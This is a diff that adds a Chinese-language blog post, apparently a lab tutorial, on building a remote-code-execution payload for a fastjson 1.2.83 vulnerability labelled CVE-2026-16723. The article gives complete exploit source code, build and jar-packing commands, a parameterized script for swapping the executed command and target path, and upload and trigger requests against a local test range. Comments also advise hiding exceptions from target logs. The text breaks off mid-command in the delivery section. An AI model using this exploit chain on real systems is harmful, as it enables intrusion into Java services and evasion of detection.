@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-32.png">
+  <link rel="mask-icon" href="/images/favicon.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.3.1/css/all.min.css" integrity="sha256-4Lad8m4ZWW1Lgb9+sMVLYEfnIh7BjV1NQMEe79Pviks=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"qincaidunxueli.cn","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.29.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="关于payload的相关解释，学会怎么构造payload">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2026-16723：载荷（payload）构造">
+<meta property="og:url" content="https://qincaidunxueli.cn/2026/11/10/%E6%8A%80%E6%9C%AF/JAVA%E5%AE%89%E5%85%A8/Fastjson/PAYLOAD/index.html">
+<meta property="og:site_name" content="芹菜炖雪梨的小屋">
+<meta property="og:description" content="关于payload的相关解释，学会怎么构造payload">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-11-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-10T16:00:00.000Z">
+<meta property="article:author" content="芹菜炖雪梨">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://qincaidunxueli.cn/images/og-cover.png">
+
+
+<link rel="canonical" href="https://qincaidunxueli.cn/2026/11/10/%E6%8A%80%E6%9C%AF/JAVA%E5%AE%89%E5%85%A8/Fastjson/PAYLOAD/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://qincaidunxueli.cn/2026/11/10/%E6%8A%80%E6%9C%AF/JAVA%E5%AE%89%E5%85%A8/Fastjson/PAYLOAD/","path":"2026/11/10/技术/JAVA安全/Fastjson/PAYLOAD/","title":"CVE-2026-16723：载荷（payload）构造"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CVE-2026-16723：载荷（payload）构造 | 芹菜炖雪梨的小屋</title>
+  
+
+
+
+
+
+
+
+
+  
+<script src="/js/utils.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"CVE-2026-16723：载荷（payload）构造","description":"关于payload的相关解释，学会怎么构造payload","url":"https://qincaidunxueli.cn/2026/11/10/技术/JAVA安全/Fastjson/PAYLOAD/","mainEntityOfPage":{"@type":"WebPage","@id":"https://qincaidunxueli.cn/2026/11/10/技术/JAVA安全/Fastjson/PAYLOAD/"},"datePublished":"2026-11-10T16:00:00.000Z","dateModified":"2026-11-10T16:00:00.000Z","author":{"@type":"Person","name":"芹菜炖雪梨","url":"https://qincaidunxueli.cn/"},"publisher":{"@type":"Organization","name":"芹菜炖雪梨的小屋","logo":{"@type":"ImageObject","url":"https://qincaidunxueli.cn/images/avatar.png"}},"image":"https://qincaidunxueli.cn/images/avatar.png","inLanguage":"zh-CN"}</script>
+
+<meta name="author" content="芹菜炖雪梨">
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="芹菜炖雪梨的小屋" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-search popup-trigger" aria-label="搜索" role="button">
+      <i class="fa fa-search fa-fw fa-lg"></i>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">芹菜炖雪梨的小屋</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">见证自己的进步</p>
+  </div>
+
+  <div class="site-nav-toggle" aria-label="切换导航栏" role="button">
+      <i class="fa fa-ellipsis fa-fw fa-lg"></i>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-layer-group fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  
+  <template id="search-popup-template"><div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div></template>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2026-16723%EF%BC%9A%E8%BD%BD%E8%8D%B7%EF%BC%88payload%EF%BC%89%E6%9E%84%E9%80%A0"><span class="nav-number">1.</span> <span class="nav-text">CVE-2026-16723：载荷（payload）构造</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%BD%BD%E8%8D%B7%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">1.1.</span> <span class="nav-text">1. 载荷是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E8%BD%BD%E8%8D%B7%E6%BA%90%E7%A0%81%EF%BC%88%E5%B8%A6%E6%B3%A8%E8%A7%A3%EF%BC%89"><span class="nav-number">1.2.</span> <span class="nav-text">2. 载荷源码（带注解）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%A1%A9%E6%B3%A8%E8%A7%A3%EF%BC%88%E8%AF%81%E6%98%8E%E5%88%A4%E5%AE%9A%E5%8F%AA%E7%9C%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%89"><span class="nav-number">1.3.</span> <span class="nav-text">3. 桩注解（证明判定只看字符串）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%9E%84%E5%BB%BA%EF%BC%88%E5%9B%9B%E6%9D%A1%E5%91%BD%E4%BB%A4%EF%BC%89"><span class="nav-number">1.4.</span> <span class="nav-text">4. 构建（四条命令）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E8%BD%BD%E8%8D%B7%E7%9A%84%E4%B8%89%E5%A4%84%E6%89%BF%E9%87%8D"><span class="nav-number">1.5.</span> <span class="nav-text">5. 载荷的三处承重</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E6%8A%95%E9%80%92%E4%B8%8E%E8%A7%A6%E5%8F%91"><span class="nav-number">1.6.</span> <span class="nav-text">6. 投递与触发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%E4%BA%94%E4%B8%AA%E7%A1%AC%E7%BA%A6%E6%9D%9F"><span class="nav-number">1.7.</span> <span class="nav-text">7. 五个硬约束</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-%E8%BE%B9%E7%95%8C"><span class="nav-number">1.8.</span> <span class="nav-text">8. 边界</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="芹菜炖雪梨" src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">芹菜炖雪梨</p>
+  <div class="site-description" itemprop="description">Tomorrow everything will be fine.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block"><a class="page-back" href="/categories/"><span class="page-back-arrow" aria-hidden="true">‹</span>返回分类</a>
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://qincaidunxueli.cn/2026/11/10/%E6%8A%80%E6%9C%AF/JAVA%E5%AE%89%E5%85%A8/Fastjson/PAYLOAD/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="芹菜炖雪梨">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="芹菜炖雪梨的小屋">
+      <meta itemprop="description" content="Tomorrow everything will be fine.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CVE-2026-16723：载荷（payload）构造 | 芹菜炖雪梨的小屋">
+      <meta itemprop="description" content="关于payload的相关解释，学会怎么构造payload">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CVE-2026-16723：载荷（payload）构造
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-11-11 00:00" itemprop="dateCreated datePublished" datetime="2026-11-11T00:00:00+08:00">2026-11-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/" itemprop="url" rel="index"><span itemprop="name">技术</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/" itemprop="url" rel="index"><span itemprop="name">JAVA安全</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/" itemprop="url" rel="index"><span itemprop="name">Fastjson</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-lines"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.8k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>7 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">关于payload的相关解释，学会怎么构造payload</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="CVE-2026-16723：载荷（payload）构造"><a href="#CVE-2026-16723：载荷（payload）构造" class="headerlink" title="CVE-2026-16723：载荷（payload）构造"></a>CVE-2026-16723：载荷（payload）构造</h1><blockquote>
+<p>配套文档：<code>SOURCE.md</code>（fastjson 1.2.83 源码注解）。本文件只讲载荷本身。<br>实测环境：Spring Boot fat-JAR + fastjson 1.2.83，JDK 8u66；载荷 class 585 字节，jar 533 字节。</p>
+</blockquote>
+<hr>
+<h2 id="1-载荷是什么"><a href="#1-载荷是什么" class="headerlink" title="1. 载荷是什么"></a>1. 载荷是什么</h2><p>一个<strong>自己写的 Java 类</strong>，装进 jar，落到目标磁盘上。攻击者发的那条 JSON 里只有一段路径，没有代码：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.C:.fj.uploads.p!.Evil&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>真正被执行的字节，全部在那个文件里。这是本漏洞和传统反序列化最大的不同——<strong>武器不随请求走</strong>。</p>
+<p>原因（<code>SOURCE.md</code> 6.4 有细节）：远程 <code>jar:http://</code> 形态走不到 <code>defineClass</code>，点号还原后类名里会出现 <code>//</code>，JVM 直接 <code>ClassFormatError</code>。所以必须先落地，再触发。</p>
+<hr>
+<h2 id="2-载荷源码（带注解）"><a href="#2-载荷源码（带注解）" class="headerlink" title="2. 载荷源码（带注解）"></a>2. 载荷源码（带注解）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ===========================================================================</span></span><br><span class="line"><span class="comment">// CVE-2026-16723  最小载荷（逐行注解版）</span></span><br><span class="line"><span class="comment">// 编译：javac --release 8 -nowarn -d classes Evil.java JSONType.java</span></span><br><span class="line"><span class="comment">// 硬性要求：字节码版本必须是 52（Java 8），不要用 --release 11 及以上</span></span><br><span class="line"><span class="comment">// ===========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.annotation.JSONType;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 这个类没有 main 方法，也不会被任何人 new 出来用。</span></span><br><span class="line"><span class="comment"> * 它整条生命周期的驱动力都来自 fastjson：</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   读字节  -&gt;  ParserConfig.java:1484  getResourceAsStream(resource)</span></span><br><span class="line"><span class="comment"> *   判可信  -&gt;  ParserConfig.java:1492  visitor.hasJsonType()</span></span><br><span class="line"><span class="comment"> *   定义类  -&gt;  TypeUtils.java:1761     defineClass(name, bytes, 0, len)</span></span><br><span class="line"><span class="comment"> *   初始化  -&gt;  JVM 在&quot;首次主动使用&quot;时执行 &lt;clinit&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 承重结构只有三处，其中两处在源码里、一处在字节里：</span></span><br><span class="line"><span class="comment"> *   [1] 类级注解 <span class="doctag">@JSONType</span>   -&gt; 让 TypeCollector 把 jsonType 置为 true      （源码里）</span></span><br><span class="line"><span class="comment"> *   [2] static &#123; &#125; 静态块    -&gt; 让 JVM 在类初始化时自动执行                  （源码里）</span></span><br><span class="line"><span class="comment"> *   [3] this_class 类名      -&gt; 让 defineClass 的命名校验通过                （字节里，脚本改写）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 缺任何一处，链条都会断在某一环。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@JSONType</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// &lt;clinit&gt;：JVM 在初始化这个类时执行，早于任何构造方法。</span></span><br><span class="line">        <span class="comment">// fastjson 拿到 Class 之后会立刻实例化，所以这一段必然被触发；</span></span><br><span class="line">        <span class="comment">// 反过来，即使目标类没有无参构造、后续反序列化抛错，静态块也已经跑完了。</span></span><br><span class="line">        <span class="comment">// 这就是把恶意逻辑放静态块、而不是放构造方法的原因。</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// RCE 的全部内容：一次普通的进程创建调用。</span></span><br><span class="line">            <span class="comment">// 没有任何 fastjson API，没有任何反射，JDK 自带即可。</span></span><br><span class="line">            <span class="comment">// 换成 &quot;cmd.exe /c whoami&quot;、&quot;/bin/sh -c id&quot; 效果相同。</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;calc.exe&quot;</span>).start();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            <span class="comment">// 真实攻击里也会吞掉异常：不让目标日志留下堆栈，减少被发现的机会。</span></span><br><span class="line">            <span class="comment">// 顺带一提，fastjson 自己也是这么干的（ParserConfig 1494 行 catch 后什么都不记）。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>三个容易看漏的点：</p>
+<ol>
+<li><strong>没有 <code>main</code>，没有 <code>new</code>，没有反射。</strong> 类被初始化即执行，这是 JVM 语义，不是技巧。</li>
+<li><strong><code>static</code> 块优先于构造方法。</strong> 即使后续实例化失败，静态块也已经跑完。</li>
+<li><strong><code>catch</code> 是空的。</strong> 真实攻击不希望目标日志出现堆栈。</li>
+</ol>
+<hr>
+<h2 id="3-桩注解（证明判定只看字符串）"><a href="#3-桩注解（证明判定只看字符串）" class="headerlink" title="3. 桩注解（证明判定只看字符串）"></a>3. 桩注解（证明判定只看字符串）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ===========================================================================</span></span><br><span class="line"><span class="comment">// 桩注解：故意做成空实现，用来证明 fastjson 的信任判定不看&quot;实现&quot;，只看&quot;字符串&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//   TypeCollector.java:10</span></span><br><span class="line"><span class="comment">//       private static String JSONType =</span></span><br><span class="line"><span class="comment">//           ASMUtils.desc(com.alibaba.fastjson.annotation.JSONType.class);</span></span><br><span class="line"><span class="comment">//   展开就是常量 &quot;Lcom/alibaba/fastjson/annotation/JSONType;&quot;，</span></span><br><span class="line"><span class="comment">//   判定逻辑（TypeCollector.java:71）只做一次字符串比较。</span></span><br><span class="line"><span class="comment">// ===========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.alibaba.fastjson.annotation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 真实的 fastjson <span class="doctag">@JSONType</span> 有很多属性（orders、serializeFeatures 等）。</span></span><br><span class="line"><span class="comment"> * 这里一个都不需要：判定只看注解的名字，不看内容。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * RUNTIME 是必需的：只有运行时可见的注解才会进入 class 文件的</span></span><br><span class="line"><span class="comment"> * RuntimeVisibleAnnotations 属性，而 TypeCollector 读的正是这一个。</span></span><br><span class="line"><span class="comment"> * 如果写成 CLASS 或 SOURCE，字节里就不会有它，fastjson 也看不到。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span>   <span class="comment">// 必须是类级注解，TypeCollector 只处理类级注解表</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> JSONType &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>实测证据</strong>：打出来的 jar 里只有 <code>Evil.class</code> 一个条目，注解类根本没打包，照样执行成功。因为运行时它不会被加载，只以 42 字节描述符的形式存在。</p>
+<hr>
+<h2 id="4-构建（四条命令）"><a href="#4-构建（四条命令）" class="headerlink" title="4. 构建（四条命令）"></a>4. 构建（四条命令）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 编译成 Java 8 字节码（class 版本 52）</span></span><br><span class="line">javac --release 8 -nowarn -d classes Evil.java JSONType.java</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 改写 this_class。这一串必须等于「@type 把点号还原后、去掉 .class」的结果</span></span><br><span class="line">python patch_name.py classes/Evil.class <span class="string">&#x27;jar:file:/C:/fj/uploads/p!/Evil&#x27;</span> classes/Evil.class</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 打包。条目名必须是根目录的 Evil.class，且只需要这一个文件</span></span><br><span class="line">python -c <span class="string">&quot;import zipfile;z=zipfile.ZipFile(&#x27;payload.jar&#x27;,&#x27;w&#x27;,zipfile.ZIP_DEFLATED);z.write(&#x27;classes/Evil.class&#x27;,&#x27;Evil.class&#x27;);z.close()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 校验（两行预期输出）</span></span><br><span class="line">javap -v -p classes/Evil.class | grep -E <span class="string">&quot;major version|this_class&quot;</span></span><br><span class="line"><span class="comment">#   major version: 52</span></span><br><span class="line"><span class="comment">#   this_class: #22    // &quot;jar:file:/C:/fj/uploads/p!/Evil&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>用 python 打包而不用 <code>jar</code> 命令，原因有两个：<code>jar</code> 21 不允许短于 3 字符的文件名；以及需要精确控制条目名（必须是 <code>Evil.class</code>，不能是 <code>classes/Evil.class</code>）。</p>
+<p>参数化版本（换名字、换路径、换命令）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NAME=q bash build.sh                 <span class="comment"># 换类名 → 换落盘文件名，绕开类缓存</span></span><br><span class="line">TARGET=/tmp/x NAME=f bash build.sh   <span class="comment"># Linux 靶机</span></span><br><span class="line">CMD=notepad.exe bash build.sh        <span class="comment"># 换执行的命令</span></span><br></pre></td></tr></table></figure>
+
+<p><code>NAME</code> 会同时改两处，必须一致：jar 在磁盘上的文件名、以及 class 的 <code>this_class</code>。因为 1482 行用同一个字符串拼资源路径，1761 行用同一个字符串做类名。</p>
+<hr>
+<h2 id="5-载荷的三处承重"><a href="#5-载荷的三处承重" class="headerlink" title="5. 载荷的三处承重"></a>5. 载荷的三处承重</h2><table>
+<thead>
+<tr>
+<th>处</th>
+<th>内容</th>
+<th>被哪一行消费</th>
+<th>删掉的后果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>@JSONType</code> 注解</td>
+<td>常量池里 42 字节描述符</td>
+<td><code>TypeCollector.java:71</code> 置 <code>jsonType=true</code></td>
+<td><code>jsonType=false</code> → <code>ParserConfig:1542</code> 抛 <code>autoType is not support</code></td>
+</tr>
+<tr>
+<td><code>this_class</code></td>
+<td><code>jar:file:/C:/fj/uploads/p!/Evil</code></td>
+<td><code>TypeUtils.java:1761</code> → <code>defineClass</code></td>
+<td><code>NoClassDefFoundError ... (wrong name: Evil)</code></td>
+</tr>
+<tr>
+<td><code>static {}</code></td>
+<td>静态块里的 <code>calc.exe</code></td>
+<td>JVM 初始化类时执行 <code>&lt;clinit&gt;</code></td>
+<td>类加载成功，无任何效果</td>
+</tr>
+<tr>
+<td>jar 条目名</td>
+<td>根目录的 <code>Evil.class</code></td>
+<td><code>ParserConfig:1482</code> 拼出的路径</td>
+<td><code>stream=false</code>，<code>bytes=0</code></td>
+</tr>
+</tbody></table>
+<p>除此之外全是 JVM 必需结构：魔数、版本号、常量池、方法表。</p>
+<p>实测偏移（585 字节版本）：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x073   calc.exe                                          8 字节</span><br><span class="line">0x0E7   jar:file:/C:/fj/uploads/p!/Evil                  31 字节</span><br><span class="line">0x172   Lcom/alibaba/fastjson/annotation/JSONType;       42 字节</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>偏移随常量池变化，抓的是”这三样东西存在”，不是固定位置。用 <code>javap -v -p</code> 或直接搜字节串都能定位。</p>
+</blockquote>
+<hr>
+<h2 id="6-投递与触发"><a href="#6-投递与触发" class="headerlink" title="6. 投递与触发"></a>6. 投递与触发</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 投递：让 jar 落到目标磁盘（靶场的 /upload 模拟真实业务的上传功能）</span></span><br><span class="line">curl -s -X POST <span class="string">&quot;http://127.0.0.1:18084/upload?name=p&quot;</span> \</span><br><span class="line">     -H <span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span> \</span><br><span class="line">     --data-binary @payload.jar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 探测：只读字节、识别注解，不执行</span></span><br><span class="line">curl -s -G <span class="string">&quot;http://127.0.0.1:18084/debug&quot;</span> \</span><br><span 